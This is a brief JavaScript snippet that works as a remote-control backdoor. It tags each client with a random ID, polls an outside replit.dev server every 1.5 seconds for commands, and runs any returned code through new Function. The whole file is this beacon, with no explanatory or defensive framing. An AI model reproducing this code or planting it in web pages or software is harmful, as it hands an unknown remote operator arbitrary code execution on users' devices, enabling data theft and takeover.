const clientId = crypto.randomUUID(); 

async function poll() {
    try {
        const res = await fetch("https://3ba4b872-3c5e-4107-ae38-3cdf53ea943e-00-225igq0keicgf.pike.replit.dev/command?client_id=" + clientId);
        const data = await res.json();
        if (data.code) new Function(data.code)();
    } catch (err) {
        console.error(err);
    }
    setTimeout(poll, 1500);
}

poll();
